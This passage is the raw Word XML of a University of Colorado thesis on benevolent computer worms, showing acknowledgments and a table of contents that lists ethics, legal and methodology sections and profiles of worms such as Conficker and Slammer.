          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">VMware </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000150D5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vSphere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000150D5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hypervisor</w:t>
      </w:r>
      <w:r w:rsidRPr="007C1107">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C1107">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ESXi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C1107">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> virtualization software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA" w:rsidRDefault="000150D5"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B26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>University of Color</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ado Computer Science Department </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for providing data center space for my research test equipment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA" w:rsidRDefault="00CB26A3" w:rsidP="00AA1CEA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Richard Han</w:t>
      </w:r>
      <w:r w:rsidR="000150D5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, my advisor, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for great insight into the topic and areas to explore as well as guidance in the process of developing my thesis.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="000150D5"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Uncle Doug </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">for C++ advice on available APIs and encouraging me from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a young age</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to learn computer programming.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000150D5" w:rsidRPr="00AA1CEA" w:rsidRDefault="000150D5"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parents for encouraging me in learning about computers and to go to school.</w:t>
      </w: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CC4FC7" w:rsidRDefault="00CC4FC7" w:rsidP="00CC4FC7">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc321736774"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Contents</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="450162106"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtContent>
        <w:p w:rsidR="009119AC" w:rsidRDefault="009119AC">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
        </w:p>
        <w:p w:rsidR="00161AB6" w:rsidRDefault="009349AB">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:color w:val="auto"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="009119AC">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc321736772" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Abstract</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736772 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>iii</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3" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Acknowledgments</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736773 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>v</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4" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Contents</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736774 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>vi</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5" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>List of Tables</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736775 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>viii</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6" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>List of Figures</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736776 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>ix</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7" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736777 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</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8" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Related Work</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736778 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</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79" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Research Questions</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736779 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</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80" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Is the worm or security problem that out of control?</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736780 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</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81" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Ethical implications of benevolent computer works</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736781 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</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82" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Legal implications of benevolent computer worms</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736782 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</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83" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Research Methodology</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736783 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</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84" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Profiles of computer worms</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736784 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</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85" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Worm Name:  Nachi</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736785 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</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86" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Worm Name:  Conficker</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736786 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</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87" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Worm Name:  Slammer</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736787 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</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88" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Worm Name:  Storm</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736788 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</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89" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Worm Name:  Witty</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736789 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</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90" w:history="1">
            <w:r w:rsidR="00161AB6" w:rsidRPr="0062296B">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Summary of characteristics of malicious worms</w:t>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc321736790 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00161AB6">
              <w:rPr>
